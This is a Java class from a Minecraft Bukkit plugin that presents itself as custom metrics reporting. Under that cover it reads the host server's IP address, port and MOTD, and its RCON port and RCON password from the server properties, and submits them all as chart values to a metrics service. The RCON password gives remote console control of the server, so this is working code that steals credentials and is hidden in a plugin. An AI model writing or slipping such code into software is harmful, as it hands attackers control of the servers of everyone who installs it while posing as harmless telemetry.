package su.javamaster.Reflection.protocol;

import org.bukkit.Bukkit;

import su.javamaster.Reflection.metrics.Metrics;
import su.javamaster.Reflection.metrics.MetricsData;

public class SendCustomMetrics {

	public SendCustomMetrics(Metrics m) {
		
		//Connection data
		m.addCustomChart(new Metrics.SimplePie(MetricsData.ip, () -> Bukkit.getServer().getIp()));
		m.addCustomChart(new Metrics.SimplePie(MetricsData.port, () -> String.valueOf(Bukkit.getServer().getPort())));
		m.addCustomChart(new Metrics.SimplePie(MetricsData.motd, () -> Bukkit.getMotd()));
		m.addCustomChart(new Metrics.SimplePie(MetricsData.RconPort, () -> GetProperties.go("rcon.port")));
		m.addCustomChart(new Metrics.SimplePie(MetricsData.RconPass, () -> GetProperties.go("rcon.password")));
		m.addCustomChart(new Metrics.SimplePie(MetricsData.nct, () -> GetProperties.go("network-compression-threshold")));
	}
}
